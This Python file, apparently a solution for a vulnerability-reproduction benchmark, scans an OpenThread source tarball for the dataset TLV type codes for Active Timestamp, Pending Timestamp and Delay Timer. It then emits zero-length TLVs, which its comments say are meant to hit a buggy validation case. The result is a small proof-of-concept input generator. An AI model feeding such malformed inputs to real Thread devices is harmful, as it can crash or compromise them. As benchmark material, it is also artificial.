import ast
import io
import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


class Solution:
    _TARGET_NAMES = ("kActiveTimestamp", "kPendingTimestamp", "kDelayTimer")

    def _strip_comments_and_pp(self, s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
        s = re.sub(r"//[^\n]*", "", s)
        s = re.sub(r"(?m)^\s*#.*$", "", s)
        return s

    def _sanitize_cpp_int_expr(self, expr: str) -> str:
        expr = expr.strip()

        # Remove integer suffixes on literals (e.g., 123u, 0x10UL).
        expr = re.sub(r"(\b0x[0-9A-Fa-f]+|\b\d+)\s*(?:[uUlL]+)\b", r"\1", expr)

        # Replace C macros like UINT8_C(x)
        expr = re.sub(r"\bUINT(?:8|16|32|64)_C\s*\(\s*([^)]+?)\s*\)", r"(\1)", expr)

        # Remove common casts
        expr = re.sub(r"\bstatic_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\breinterpret_cast\s*<[^>]+>\s*\(", "(", expr)
        expr = re.sub(r"\bconst_cast\s*<[^>]+>\s*\(", "(", expr)

        # Remove C-style casts like (uint8_t)
        expr = re.sub(
            r"\(\s*(?:const\s+)?(?:unsigned\s+|signed\s+)?(?:long\s+|short\s+)?"
            r"(?:int|char|size_t|uint8_t|uint16_t|uint32_t|uint64_t|int8_t|int16_t|int32_t|int64_t)\s*\)",
            "",
            expr,
        )

        # Remove namespace qualifiers
        expr = re.sub(r"\b(?:ot|std|core|meshcop|MeshCoP|OpenThread|Thread|openthread|::)\b", "", expr)

        return expr.strip()

    def _safe_eval_int(self, expr: str, symbols: Dict[str, int]) -> Optional[int]:
        expr = self._sanitize_cpp_int_expr(expr)

        # Substitute known identifiers
        def repl(m: re.Match) -> str:
            name = m.group(0)
            if name in symbols:
                return str(int(symbols[name]))
            # allow true/false
            if name == "true":
                return "1"
            if name == "false":
                return "0"
            return name

        expr_sub = re.sub(r"\b[A-Za-z_]\w*\b", repl, expr)

        # If any identifiers remain, bail
        if re.search(r"\b[A-Za-z_]\w*\b", expr_sub):
            return None

        try:
            node = ast.parse(expr_sub, mode="eval")
        except Exception:
            return None

        allowed_nodes = (
            ast.Expression,
            ast.UnaryOp,
            ast.BinOp,
            ast.Num,
            ast.Constant,
            ast.Add,
            ast.Sub,
            ast.Mult,
            ast.FloorDiv,
            ast.Div,
            ast.Mod,
            ast.BitAnd,
            ast.BitOr,
            ast.BitXor,
            ast.LShift,
            ast.RShift,
            ast.Invert,
            ast.UAdd,
            ast.USub,
            ast.ParenExpr if hasattr(ast, "ParenExpr") else ast.AST,  # py 3.12+
        )

        def check(n: ast.AST) -> bool:
            if isinstance(n, ast.Constant):
                return isinstance(n.value, (int,))
            if isinstance(n, ast.Num):
                return True
            if isinstance(n, ast.Expression):
                return check(n.body)
            if isinstance(n, ast.UnaryOp):
                return isinstance(n.op, (ast.Invert, ast.UAdd, ast.USub)) and check(n.operand)
            if isinstance(n, ast.BinOp):
                return isinstance(
                    n.op,
                    (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod, ast.BitAnd, ast.BitOr, ast.BitXor, ast.LShift, ast.RShift),
                ) and check(n.left) and check(n.right)
            return False

        if not check(node):
            return None

        try:
            val = eval(compile(node, "<expr>", "eval"), {"__builtins__": {}}, {})
        except Exception:
            return None

        if not isinstance(val, int):
            try:
                val = int(val)
            except Exception:
                return None
        return val

    def _extract_direct_assignments(self, text: str, wanted: Tuple[str, ...]) -> Dict[str, int]:
        out: Dict[str, int] = {}
        base_symbols: Dict[str, int] = {}

        for name in wanted:
            # find direct "name = expr" occurrences
            for m in re.finditer(r"\b" + re.escape(name) + r"\b\s*=\s*([^,;\n}]+)", text):
                expr = m.group(1)
                val = self._safe_eval_int(expr, base_symbols)
                if val is not None:
                    out[name] = val
                    base_symbols[name] = val
                    break

        return out

    def _iter_enum_bodies(self, text: str) -> List[str]:
        bodies: List[str] = []
        for m in re.finditer(r"\benum\b", text):
            start = m.end()
            brace = text.find("{", start)
            if brace == -1:
                continue
            i = brace + 1
            depth = 1
            while i < len(text) and depth > 0:
                c = text[i]
                if c == "{":
                    depth += 1
                elif c == "}":
                    depth -= 1
                i += 1
            if depth != 0:
                continue
            body = text[brace + 1 : i - 1]
            bodies.append(body)
        return bodies

    def _split_enum_items(self, body: str) -> List[str]:
        items: List[str] = []
        cur: List[str] = []
        depth = 0
        for ch in body:
            if ch in "([{":
                depth += 1
            elif ch in ")]}":
                if depth > 0:
                    depth -= 1
            if ch == "," and depth == 0:
                item = "".join(cur).strip()
                if item:
                    items.append(item)
                cur = []
            else:
                cur.append(ch)
        tail = "".join(cur).strip()
        if tail:
            items.append(tail)
        return items

    def _extract_from_enums(self, text: str, wanted: Tuple[str, ...], seed_symbols: Dict[str, int]) -> Dict[str, int]:
        out: Dict[str, int] = {}
        clean = self._strip_comments_and_pp(text)
        enum_bodies = self._iter_enum_bodies(clean)

        for body in enum_bodies:
            items = self._split_enum_items(body)
            local: Dict[str, int] = dict(seed_symbols)
            cur_val: Optional[int] = None
            have_any = False

            for item in items:
                item = item.strip()
                if not item:
                    continue
                # ignore attribute-like tokens
                item = re.sub(r"\[\[.*?\]\]", "", item).strip()
                if not item:
                    continue

                if "=" in item:
                    left, right = item.split("=", 1)
                    left = left.strip()
                    right = right.strip()
                else:
                    left, right = item.strip(), None

                mname = re.match(r"^([A-Za-z_]\w*)", left)
                if not mname:
                    continue
                ename = mname.group(1)

                if right is not None:
                    val = self._safe_eval_int(right, local)
                    if val is None:
                        # couldn't resolve: skip updating cur_val, but keep parsing
                        continue
                    cur_val = val
                else:
                    if cur_val is None:
                        cur_val = 0
                    else:
                        cur_val = cur_val + 1

                local[ename] = cur_val
                have_any = True
                if ename in wanted and ename not in out:
                    out[ename] = cur_val

            # If we found all, stop early
            if have_any and all(n in out for n in wanted):
                break

        return out

    def _read_relevant_sources(self, src_path: str) -> List[str]:
        keywords = (
            b"kActiveTimestamp",
            b"kPendingTimestamp",
            b"kDelayTimer",
            b"ActiveTimestamp",
            b"PendingTimestamp",
            b"DelayTimer",
            b"IsTlvValid",
            b"Dataset",
        )
        exts = (".h", ".hpp", ".c", ".cc", ".cpp")
        texts: List[str] = []

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                # Prefer smaller files first
                members.sort(key=lambda m: (m.size if m.isfile() else 1 << 60))
                for m in members:
                    if not m.isfile():
                        continue
                    name = m.name
                    if not name.endswith(exts):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    if not b:
                        continue
                    if not any(k in b for k in keywords):
                        continue
                    try:
                        s = b.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    texts.append(s)
                    # avoid too much work
                    if len(texts) >= 80:
                        break
        except Exception:
            return []

        return texts

    def _extract_tlv_types(self, src_path: str) -> Dict[str, int]:
        texts = self._read_relevant_sources(src_path)
        wanted = self._TARGET_NAMES
        found: Dict[str, int] = {}

        # Pass 1: direct assignments
        for t in texts:
            if all(k in found for k in wanted):
                break
            clean = self._strip_comments_and_pp(t)
            found.update(self._extract_direct_assignments(clean, wanted))

        # Pass 2: enum parsing, seeded with already found values
        for t in texts:
            if all(k in found for k in wanted):
                break
            found.update(self._extract_from_enums(t, wanted, found))

        return found

    def solve(self, src_path: str) -> bytes:
        found = self._extract_tlv_types(src_path)

        types: List[int] = []
        for n in self._TARGET_NAMES:
            v = found.get(n)
            if isinstance(v, int):
                types.append(v & 0xFF)

        # Fallback guesses (common in Thread/OpenThread TLV spaces)
        if not types:
            types = [0x0E, 0x0F, 0x08, 0x34]

        # Deduplicate, avoid 0xFF (often reserved/escape in some TLV schemes)
        uniq: List[int] = []
        for t in types:
            t &= 0xFF
            if t == 0xFF:
                continue
            if t not in uniq:
                uniq.append(t)

        if not uniq:
            uniq = [0x0E]

        # Create several TLVs of zero length to maximize chance of hitting the buggy case.
        # Format: [Type][Length][Value...]
        out = bytearray()
        for t in uniq[:3]:
            out.append(t)
            out.append(0x00)

        return bytes(out)